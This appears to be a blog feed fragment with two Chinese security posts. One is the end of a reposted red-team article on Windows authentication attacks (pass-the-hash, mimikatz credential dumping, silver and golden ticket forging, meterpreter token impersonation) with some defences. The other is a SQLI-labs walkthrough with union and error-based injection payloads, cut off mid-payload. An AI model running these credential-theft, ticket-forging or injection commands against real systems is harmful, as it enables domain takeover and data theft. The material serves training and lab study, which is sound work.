class="hljs-attribute">root</span>@kali:~/cache# cme smb <span class="hljs-number">192.168.3.5</span> -u administrator -H dab<span class="hljs-number">7</span>de<span class="hljs-number">8</span>feeb<span class="hljs-number">5</span>ecac<span class="hljs-number">65</span>faf<span class="hljs-number">9</span>fdc<span class="hljs-number">6</span>cac<span class="hljs-number">3</span>a<span class="hljs-number">9</span> -x whoami<span class="hljs-attribute">SMB</span> <span class="hljs-number">192.168.3.5</span> <span class="hljs-number">445</span> LIYINGZHEA<span class="hljs-number">30</span>B[*] Windows 7 Ultimate 7601 Service Pack 1 x64 (name:LIYINGZHEA30B)(domain:PAYLOADS) (signing:False) (SMBv1:True)<span class="hljs-attribute">SMB</span> <span class="hljs-number">192.168.3.5</span> <span class="hljs-number">445</span> LIYINGZHEA<span class="hljs-number">30</span>B[+] PAYLOADS\administrator dab7de8feeb5ecac65faf9fdc6cac3a9(Pwn3d!)SMB 192.168.3.5 445 LIYINGZHEA30B [+] Executed command</code></pre><h2 id="0x02-Kerberos域认证"><a href="#0x02-Kerberos域认证" class="headerlink" title="0x02 Kerberos域认证"></a>0x02 Kerberos域认证</h2><h3 id="Active-Directory-活动目录-概念"><a href="#Active-Directory-活动目录-概念" class="headerlink" title="Active Directory(活动目录)概念"></a>Active Directory(活动目录)概念</h3><p>Windows提供了为企业管理资产、服务、网络对象进行组织化的管理，这非常符合企业架构的管理模式。而承载这些管理机制的就是活动目录服务。如果要搭建一个域，就需要安装活动目录服务，当然，这个不在我们的讨论范围。</p><p>活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。</p><ul><li>Active Directory存储了有关网络对象的信息，并且让管理员和用 户能够轻松地查找和使用这些信息。Active Directory使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻 辑的分层组织。</li><li>网络对象分为:用户、用户组、计算机、域、组织单位以及安全 策略等。</li></ul><h3 id="Active-Directory-活动目录-功能"><a href="#Active-Directory-活动目录-功能" class="headerlink" title="Active Directory(活动目录)功能"></a>Active Directory(活动目录)功能</h3><ul><li>服务器及客户端计算机管理:管理服务器及客户端计算机账户， 所有服务器及客户端计算机加入域管理并实施组策略。</li><li>用户服务:管理用户域账户、用户信息、企业通讯录(与电子邮 件系统集成)、用户组管理、用户身份认证、用户授权管理等， 按省实施组管理策略。</li><li>资源管理:管理打印机、文件共享服务等网络资源。</li><li>桌面配置:系统管理员可以集中的配置各种桌面配置策略，如: 用户使用域中资源权限限制、界面功能的限制、应用程序执行特 征限制、网络连接限制、安全配置限制等。</li><li>应用系统支撑:支持财务、人事、电子邮件、企业信息门户、办 公自动化、补丁管理、防病毒系统等各种应用系统。</li></ul><p>在域中，网络对象可以相互访问，但是在真实情况中，需要对某些部门的计算机进行限制，例如：销售部门不能访问技术部门的服务器。</p><p>这个中间就需要Kerberos认证协议来验证网络对象间的权限。</p><h3 id="域认证体系-Kerbroes"><a href="#域认证体系-Kerbroes" class="headerlink" title="域认证体系 - Kerbroes"></a>域认证体系 - Kerbroes</h3><p>Kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客 户机 / 服务器应用程序提供强大的认证服务。该认证过程的实现不 依赖于主机操作系统的认证，无需基于主机地址的信任，不要求 网络上所有主机的物理安全，并假定网络上传送的数据包可以被 任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一 种可信任的第三方认证服务，是通过传统的密码技术(如:共享 密钥)执行认证服务的。</p><h3 id="域认证所参与的角色-三只狗头"><a href="#域认证所参与的角色-三只狗头" class="headerlink" title="域认证所参与的角色 (三只狗头)"></a>域认证所参与的角色 (三只狗头)</h3><p>Kerberos的标志是三只狗头，狗头分别代表以下角色：</p><ul><li>Client</li><li>Server</li><li>KDC(Key Distribution Center) = DC(Domain Controller)</li></ul><p>Kerberos认证协议的基础概念：</p><p>票据（Ticket）：是网络对象互相访问的凭证。 TGT（Ticket Granting Ticket）：入场券，通过入场券能够获得票据，是一种临时凭证的存在。</p><p>KDC负责管理票据、认证票据、分发票据，但是KDC不是一个独立的服务，它由以下服务组成：</p><ul><li>Authentication Service: 为client生成TGT的服务</li><li>Ticket Granting Service: 为client生成某个服务的ticket</li></ul><p>另外还需要介绍一个类似于本机SAM的一个数据库：AD，全称叫account database，存储所有client的白名单，只有存 在于白名单的client才能顺利申请到TGT。</p><p>从物理层面看，AD与KDC均为域控制器(Domain Controller)。</p><h3 id="域认证粗略流程"><a href="#域认证粗略流程" class="headerlink" title="域认证粗略流程"></a>域认证粗略流程</h3><ol><li>client向kerberos服务请求，希望获取访问server的权限。 kerberos得到了这个消息，首先得判断client是否是可信赖的， 也就是白名单黑名单的说法。这就是AS服务完成的工作，通过 在AD中存储黑名单和白名单来区分client。成功后，返回AS返 回TGT给client。</li><li>client得到了TGT后，继续向kerberos请求，希望获取访问 server的权限。kerberos又得到了这个消息，这时候通过client 消息中的TGT，判断出了client拥有了这个权限，给了client访 问server的权限ticket。</li><li>client得到ticket后，终于可以成功访问server。这个ticket只是 针对这个server，其他server需要向TGS申请。</li></ol><h3 id="域认证"><a href="#域认证" class="headerlink" title="域认证"></a>域认证</h3><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/02.png" alt="域认证"></p><p>首先，客户端需要发送自己的身份信息到KDC，身份信息中起码包含用户名，KDC根据用户名在AD中寻找是否在白名单中，然后根据用户名提取到对应的NTLM Hash。</p><p>KDC此时生成一个随机字符串，叫Session Key，使用用户名对应的NTLM Hash加密Session Key，作为AS数据，使用KDC中某个用户的NTLM Hash加密Session Key和客户端的信息，生成TGT。</p><ul><li>Session Key用于客户端向TGS服务通信。</li><li>域内所有网络对象的凭证都在AD中保存</li><li>KDC中某个用户指的是krbtgt</li></ul><p>数据结构：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/03.png" alt="域认证"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/04.png" alt="域认证"></p><p>其中，TGT的到期时间为8小时，如果超过了8小时，还需要重新申请TGT，不能之间进入下一步获取Ticket。</p><p>Kerberos是一个假设网络环境不安全的情况下能够正常进行认证工作的协议。</p><p>第一步中，KDC返回的TGT客户端是无法解密的，因为它没有KDC Hash，如果有，我们就可以伪造黄金票据，这个是后话了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/05.png" alt="域认证"></p><p>第二步客户端需要提供TGT与第一步中使用自己NTLM Hash解密出来的Session Key加密的客户端信息跟时间戳。</p><p>如果假设这个数据被中间人窃取到，也无法在段时间内破解，因为KDC会校验时间戳。</p><p>KDC接到TGT与其他内容后，会首先解密TGT，只有KDC可以解密TGT，从TGT中提取到Session Key，再使用Session Key解密其他内容，解密出来的内容同TGT中的信息进行校验来确认客户端是否受信。</p><p>验证通过后，就会生成一个新的Session Key，我们称之为Server Session Key，这个Server Session Key主要用于和服务器进行通信。同时还会生成一个Ticket，也就是最后的票据了。</p><p>Ticket组成如下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/06.png" alt="域认证"></p><p>Server Hash：这个Hash是在AD中服务器计算机的NTLM Hash。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/07.png" alt="域认证"></p><p>在第三步里，客户端向服务器请求，需要提供Ticket，Server Session Key加密的客户端信息与时间戳。</p><ul><li>Ticket客户端无法解密</li><li>服务器端通过解密Ticket解密Server Session Key(Client info + Timestamp)</li><li>比较时间长度</li></ul><p>校验通过后，认证成功，该票据会一直存在客户端内存中。</p><h3 id="白银票据-Silver-Tickets"><a href="#白银票据-Silver-Tickets" class="headerlink" title="白银票据(Silver Tickets)"></a>白银票据(Silver Tickets)</h3><p>白银票据特点:</p><ul><li>1.不需要与KDC进行交互</li><li>2.需要目标服务的NTLM Hash</li></ul><p>在第三步认证中的Ticket的组成:</p><pre><code class="hljs pgsql">Ticket=<span class="hljs-keyword">Server</span> Hash(<span class="hljs-keyword">Server</span> <span class="hljs-keyword">Session</span> Key+Client <span class="hljs-keyword">info</span>+<span class="hljs-keyword">End</span> <span class="hljs-type">Time</span>) </code></pre><p>当拥有Server Hash时，我们就可以伪造一个不经过KDC认证的一个Ticket。</p><p><strong>PS:Server Session Key在未发送Ticket之前，服务器是不知道Server Session Key是什么的。 所以，一切凭据都来源于Server Hash。</strong></p><h3 id="伪造白银票据-Silver-Tickets"><a href="#伪造白银票据-Silver-Tickets" class="headerlink" title="伪造白银票据(Silver Tickets)"></a>伪造白银票据(Silver Tickets)</h3><p>首先需要导出Server Hash：</p><pre><code class="hljs vim">C:\<span class="hljs-keyword">files</span>&gt;mimikatz.<span class="hljs-keyword">exe</span> <span class="hljs-string">&quot;privilege::debug” &quot;</span>sekurls<span class="hljs-variable">a:</span>:logonpasswords<span class="hljs-string">&quot; &quot;</span><span class="hljs-keyword">exit</span><span class="hljs-comment">&quot; &gt; log.txt</span></code></pre><p>伪造票据:</p><pre><code class="hljs elixir">mimikatz “kerberos::golden /<span class="hljs-symbol">domain:</span>&lt;域名&gt; <span class="hljs-regexp">/sid:&lt;域 SID&gt; /target</span><span class="hljs-symbol">:&lt;</span>目标服务器主机名&gt; <span class="hljs-regexp">/service:&lt;服务类型&gt; /rc</span>4<span class="hljs-symbol">:&lt;NTLM</span> Hash&gt; <span class="hljs-regexp">/user:&lt;用户名&gt; /ptt</span><span class="hljs-string">&quot; exit</span><span class="hljs-string"></span></code></pre><p>Other：</p><ul><li>kerberos::list #列出票据</li><li>kerberos::purge # 清除票据</li></ul><p>由于白银票据需要目标服务器的Hash，所以没办法生成对应域内 所有服务器的票据，也不能通过TGT申请。因此只能针对服务器 上的某些服务去伪造，伪造的服务类型列表如下:</p><table><thead><tr><th>服务注释</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>Powershell Remoteing</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>LDAP 、DCSync</td><td>LDAP</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>Windows Remote ServerAdministration Tools</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h3 id="白银票据-Silver-Tickets-演示"><a href="#白银票据-Silver-Tickets-演示" class="headerlink" title="白银票据(Silver Tickets)演示"></a>白银票据(Silver Tickets)演示</h3><h3 id="白银票据-Silver-Tickets-防御"><a href="#白银票据-Silver-Tickets-防御" class="headerlink" title="白银票据(Silver Tickets)防御"></a>白银票据(Silver Tickets)防御</h3><ul><li>1.尽量保证服务器凭证不被窃取</li><li>2.开启PAC (Privileged Attribute Certificate) 特权属性证书保护 功能，PAC主要是规定服务器将票据发送给kerberos服务，由 kerberos服务验证票据是否有效。</li></ul><p>开启方式:</p><p>将注册表中</p><pre><code class="hljs taggerscript">HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>YSTEM <span class="hljs-symbol">\ </span>CurrentControlSet<span class="hljs-symbol">\C</span>ontrol<span class="hljs-symbol">\L</span>sa<span class="hljs-symbol">\K</span>erberos<span class="hljs-symbol">\P</span>arameters</code></pre><p>中的<code>ValidateKdcPacSignature</code>设置为1。</p><h3 id="黄金票据-Golden-Tickets"><a href="#黄金票据-Golden-Tickets" class="headerlink" title="黄金票据(Golden Tickets)"></a>黄金票据(Golden Tickets)</h3><p>黄金票据特点:</p><ul><li>1.需要与DC通信</li><li>2.需要krbtgt用户的hash</li></ul><p><strong>PS:这里的krbtgt hash就是之前讲的KDC Hash</strong></p><h3 id="黄金票据-Golden-Tickets-MSF-kiwi"><a href="#黄金票据-Golden-Tickets-MSF-kiwi" class="headerlink" title="黄金票据(Golden Tickets)-MSF kiwi"></a>黄金票据(Golden Tickets)-MSF kiwi</h3><p>使用meterpreter中的kiwi模块：</p><pre><code class="hljs ebnf"><span class="hljs-attribute">load kiwi</span></code></pre><p>创建票据：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/08.png" alt="黄金票据"></p><p>注入到内存：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/09.png" alt="黄金票据"></p><p>使用wmic在目标服务器上创建一个进程：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/20190512_%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3Windows%E8%AE%A4%E8%AF%81/10.png" alt="黄金票据"></p><h3 id="黄金票据-Golden-Tickets-伪造"><a href="#黄金票据-Golden-Tickets-伪造" class="headerlink" title="黄金票据(Golden Tickets) - 伪造"></a>黄金票据(Golden Tickets) - 伪造</h3><p>伪造票据:</p><pre><code class="hljs elixir">mimikatz “kerberos::golden /<span class="hljs-symbol">domain:</span>&lt;域名&gt; <span class="hljs-regexp">/sid:&lt;域SID&gt; /rc</span>4<span class="hljs-symbol">:&lt;KRBTGT</span> NTLM Hash&gt; <span class="hljs-regexp">/user:&lt;任意用户名&gt; /ptt</span><span class="hljs-string">&quot; exit</span><span class="hljs-string"></span></code></pre><h3 id="黄金票据-Golden-Tickets-演示"><a href="#黄金票据-Golden-Tickets-演示" class="headerlink" title="黄金票据(Golden Tickets) - 演示"></a>黄金票据(Golden Tickets) - 演示</h3><h3 id="Tickets-总结"><a href="#Tickets-总结" class="headerlink" title="Tickets 总结"></a>Tickets 总结</h3><ul><li>黄金票据:从攻击面来看，获取krbtgt用户的hash后，可以在域中 进行持久性的隐藏，并且日志无法溯源，但是需要拿到DC权限， 使用黄金票据能够在一个域环境中长时间控制整个域。</li><li>从防御角度来看，需要经常更新krbtgt的密码，才能够使得原有的 票据失效。最根本的办法是不允许域管账户登录其他服务器。</li><li>白银票据:从攻击面来看，伪造白银票据的难度比伪造黄金票据的 难度较小，因为一个域中的服务器如果对外的话，非常容易被入侵， 并且容易被转储Server。</li><li>从防御角度来看，需要开启PAC认证，但这会降低认证效率，增加 DC的负担，最根本的还是要加固服务器本身对外的服务。</li></ul><h2 id="0x03-Windows-Access-Token"><a href="#0x03-Windows-Access-Token" class="headerlink" title="0x03 Windows Access Token"></a>0x03 Windows Access Token</h2><h3 id="Windows-Access-Token-简介"><a href="#Windows-Access-Token-简介" class="headerlink" title="Windows Access Token 简介"></a>Windows Access Token 简介</h3><p>Windows Token其实叫Access Token(访问令牌)，它是一个描 述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程 时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该 进程没有B用户的权限。</p><p>Access Token种类：</p><ul><li>主令牌</li><li>模拟令牌</li></ul><p>一般情况下，用户双击运行一个程序，都会拷贝“explorer.exe”的Access Token。</p><p>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清除，只有在重启机器后才会清除。</p><h3 id="Windows-Access-Token组成"><a href="#Windows-Access-Token组成" class="headerlink" title="Windows Access Token组成"></a>Windows Access Token组成</h3><ul><li>用户帐户的安全标识符(SID)</li><li>用户所属的组的SID</li><li>用于标识当前登录会话的登录SID</li><li>用户或用户组所拥有的权限列表</li><li>所有者SID</li><li>主要组的SID</li><li>访问控制列表</li><li>访问令牌的来源</li><li>令牌是主要令牌还是模拟令牌</li><li>限制SID的可选列表</li><li>目前的模拟等级</li><li>其他统计数据</li></ul><h3 id="Windows-Access-Token-–-SID-Security-Identifiers-安全标识符"><a href="#Windows-Access-Token-–-SID-Security-Identifiers-安全标识符" class="headerlink" title="Windows Access Token – SID (Security Identifiers)安全标识符"></a>Windows Access Token – SID (Security Identifiers)安全标识符</h3><p>安全标识符是一个唯一的字符串，它可以代表一个账户、一个用户 组、或者是一次登录。通常它还有一个SID固定列表，例如 Everyone这种已经内置的账户，默认拥有<a href="https://docs.microsoft.com/zh-%20cn/windows/desktop/SecAuthZ/well-known-sids">固定的SID</a>。</p><p>SID的表现形式:</p><ul><li>域SID-用户ID</li><li>计算机SID-用户ID</li><li>SID列表都会存储在域控的AD或者计算机本地账户数据库中。</li></ul><h3 id="Windows-Access-Token产生过程"><a href="#Windows-Access-Token产生过程" class="headerlink" title="Windows Access Token产生过程"></a>Windows Access Token产生过程</h3><p>每个进程创建时都会根据登录会话权限由LSA(Local Security Authority)分配一个Token(如果CreaetProcess时自己指定了 Token, LSA会用该Token， 否则就用父进程Token的一份拷贝。</p><h3 id="Windows-Access-Token令牌假冒实战"><a href="#Windows-Access-Token令牌假冒实战" class="headerlink" title="Windows Access Token令牌假冒实战"></a>Windows Access Token令牌假冒实战</h3><p><strong>当用户注销后，系统将会使主令牌切换为模拟令牌，不会将令牌清 除，只有在重启机器后才会清除。</strong></p><p>可以使用多种工具查看目前系统上存在的模拟令牌:</p><ul><li>Incognito</li><li>Powershell - Invoke-TokenManipulation.ps1</li><li>Cobalt Strike - steal_token</li></ul><p>案例(针对某跨国企业的一次渗透测试 获取DC权限）: <a href="http://blog.360ec.net/archives/32/">http://blog.360ec.net/archives/32/</a></p><h3 id="Windows-Access-Token令牌假冒实战-1"><a href="#Windows-Access-Token令牌假冒实战-1" class="headerlink" title="Windows Access Token令牌假冒实战"></a>Windows Access Token令牌假冒实战</h3><pre><code class="hljs taggerscript">meterpreter &gt; getsystemmeterpreter &gt; load incognito meterpreter &gt; list_tokens –uDelegation Tokens Available ============================== NT AUTHORITY<span class="hljs-symbol">\L</span>OCAL SERVICENT AUTHORITY<span class="hljs-symbol">\N</span>ETWORK SERVICENT AUTHORITY<span class="hljs-symbol">\S</span>YSTEM PAYLOADS<span class="hljs-symbol">\A</span>dministrator PAYLOADS<span class="hljs-symbol">\w</span>7meterpreter &gt; impersonate_token &quot;PAYLOADS<span class="hljs-symbol">\A</span>dministrator”[+] Delegation token available[+] Successfully impersonated user PAYLOADS<span class="hljs-symbol">\A</span>dministrator</code></pre><h3 id="Windows-Access-Token令牌假冒防御"><a href="#Windows-Access-Token令牌假冒防御" class="headerlink" title="Windows Access Token令牌假冒防御"></a>Windows Access Token令牌假冒防御</h3><p>禁止Domain Admins登录对外且未做安全加固的服务器，因为一旦服务器被入侵，域管理员的令牌可能会被攻击者假冒，从控制DC。</p><p>如果想清除假冒，重启服务器即可。</p><h2 id="0x04-知识点总结"><a href="#0x04-知识点总结" class="headerlink" title="0x04 知识点总结"></a>0x04 知识点总结</h2><p>本次议题围绕着Windows认证分别讲解了Pass The Hash、Silver Tickets、Golden Tickets、 Impersonation Token的原理。 这些技术分别能够满足我们在渗透中持续的维持权限、提权。</p><p>可拓展:</p><p>域渗透技术/思路，SPN扫描，Red/Blue team</p><ul><li><a href="https://lolbas-project.github.io/">https://lolbas-project.github.io/</a></li><li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li><li><a href="https://github.com/yeyintminthuhtut/Awesome-Red-Teaming">https://github.com/yeyintminthuhtut/Awesome-Red-Teaming</a></li></ul><p><strong>转载自：</strong></p><p><a href="https://payloads.online/archivers/2018-11-30/1">https://payloads.online/archivers/2018-11-30/1</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-本地认证&quot;&gt;&lt;a href=&quot;#0x00-本地认证&quot; class=&quot;headerlink&quot; title=&quot;0x00 本地认证&quot;&gt;&lt;/a&gt;0x00 本地认证&lt;/h2&gt;&lt;h3 id=&quot;本地认证基础知识&quot;&gt;&lt;a href=&quot;#本地认证基础知识&quot; class=&quot;</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="域渗透" scheme="http://www.secice.cn/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
    <category term="Windows认证" scheme="http://www.secice.cn/tags/Windows%E8%AE%A4%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>SQLI labs 靶场笔记之进阶挑战 54-65 关</title>
    <link href="http://www.secice.cn/p/32046ada"/>
    <id>http://www.secice.cn/p/32046ada</id>
    <published>2020-07-23T07:41:04.000Z</published>
    <updated>2020-12-24T02:15:56.243Z</updated>
    
    <content type="html"><![CDATA[<h1 id="进阶挑战-54-65-关"><a href="#进阶挑战-54-65-关" class="headerlink" title="进阶挑战 54-65 关"></a>进阶挑战 54-65 关</h1><h2 id="Less-54"><a href="#Less-54" class="headerlink" title="Less-54"></a>Less-54</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>简单源码分析：</p><pre><code class="hljs Php"><span class="hljs-keyword">if</span> reset:    <span class="hljs-comment"># 根据时间戳生成 cookie</span>    setcookie(<span class="hljs-string">&#x27;challenge&#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>, time() - <span class="hljs-number">3600000</span>);<span class="hljs-keyword">else</span>:    <span class="hljs-keyword">if</span> cookie 中有 challenge:        <span class="hljs-variable">$sessid</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];    <span class="hljs-keyword">else</span>:        <span class="hljs-comment"># 生成 cookie </span>        <span class="hljs-variable">$expire</span> = time()+<span class="hljs-number">60</span>*<span class="hljs-number">60</span>*<span class="hljs-number">24</span>*<span class="hljs-number">30</span>;        <span class="hljs-variable">$hash</span> = data(<span class="hljs-variable">$table</span>,<span class="hljs-variable">$col</span>);        setcookie(<span class="hljs-string">&quot;challenge&quot;</span>, <span class="hljs-variable">$hash</span>, <span class="hljs-variable">$expire</span>);    <span class="hljs-keyword">if</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]:        计数器 + <span class="hljs-number">1</span>        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;    <span class="hljs-keyword">if</span> 有查询成功:        输出查询信息    <span class="hljs-keyword">else</span>：        啥都不输出<span class="hljs-comment"># key 被双重过滤了</span><span class="hljs-variable">$key</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-variable">$key</span> = mysql_real_escape_string(<span class="hljs-variable">$key</span>);<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT 1 FROM <span class="hljs-subst">$table</span> WHERE <span class="hljs-subst">$col1</span>= &#x27;<span class="hljs-subst">$key</span>&#x27;&quot;</span>;</code></pre><p>代码中可以分享出，得让我们在 10 次注入测试中拿到 key 值。看了源码可以直接联合查询，10 次以内拿到 key 感觉问题不大，那么尝试看看吧：</p><p><strong>判断闭合方式</strong></p><pre><code class="hljs sql">?id=1&#x27;<span class="hljs-comment">--+</span></code></pre><p><strong>判断字段数</strong></p><pre><code class="hljs sql">?id=1&#x27; order by 3<span class="hljs-comment">--+</span>?id=1&#x27; order by 4<span class="hljs-comment">--+</span></code></pre><p><strong>查询有可注入的字段</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>字段数 2,3</p><p><strong>查询表名</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()) <span class="hljs-comment">--+</span></code></pre><p>表名为：<code>bplubnri6m</code>，这个表名可能是随机的 不同用户不一样</p><p><strong>查询列名</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;bplubnri6m&#x27;</span>) <span class="hljs-comment">--+</span></code></pre><p>查到列名如下：id,sessid,secret_0UH9,tryy</p><p><strong>查询字段值</strong></p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(secret_0UH9) <span class="hljs-keyword">from</span> bplubnri6m) <span class="hljs-comment">--+</span></code></pre><p>拿到 key 值为：Vbf3WpKCBvu8s4rnCTEeWcPa</p><p>总共只需要 6 步，其中在判断字段数这里有不确定性，理论上 10 步以内是可以正常注入出来的。</p><h2 id="Less-55"><a href="#Less-55" class="headerlink" title="Less-55"></a>Less-55</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=($id)</code></td></tr></tbody></table><p>Less-55 给了 14 次尝试机会，代码基本上没有变化，只是闭合方式发生了变化，这里不再赘述。</p><h2 id="Less-56"><a href="#Less-56" class="headerlink" title="Less-56"></a>Less-56</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-57"><a href="#Less-57" class="headerlink" title="Less-57"></a>Less-57</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-54 相比只是拼接方式不一样，还是那个姿势，详见 Less-54</p><h2 id="Less-58"><a href="#Less-58" class="headerlink" title="Less-58"></a>Less-58</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>Less-58 这里相比较于 Less-54 - Less-57 变化还是比较大的，主要有明显区别的代码如下：</p><pre><code class="hljs Php"><span class="hljs-variable">$unames</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Dumb&quot;</span>,<span class="hljs-string">&quot;Angelina&quot;</span>,<span class="hljs-string">&quot;Dummy&quot;</span>,<span class="hljs-string">&quot;secure&quot;</span>,<span class="hljs-string">&quot;stupid&quot;</span>,<span class="hljs-string">&quot;superman&quot;</span>,<span class="hljs-string">&quot;batman&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin1&quot;</span>,<span class="hljs-string">&quot;admin2&quot;</span>,<span class="hljs-string">&quot;admin3&quot;</span>,<span class="hljs-string">&quot;dhakkan&quot;</span>,<span class="hljs-string">&quot;admin4&quot;</span>);<span class="hljs-variable">$pass</span> = (<span class="hljs-variable">$unames</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Login name : &#x27;</span>. <span class="hljs-variable">$unames</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your Password : &#x27;</span> .<span class="hljs-variable">$pass</span>[<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>]];</code></pre><p>因为这里输出只输出 <code>$unames</code> 和 <code>$pass</code> 数组，pass 数组就是 unames 数组的逆序，所以这里使用联合查询的话是没有效果的，输出不了有用的信息。天无绝人之路，但是下面输出：</p><pre><code class="hljs php">print_r(mysql_error());</code></pre><p>所以这里就可以进行报错注入，下面直接丢 payload 吧：</p><pre><code class="hljs sql">?id=1&#x27; and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span 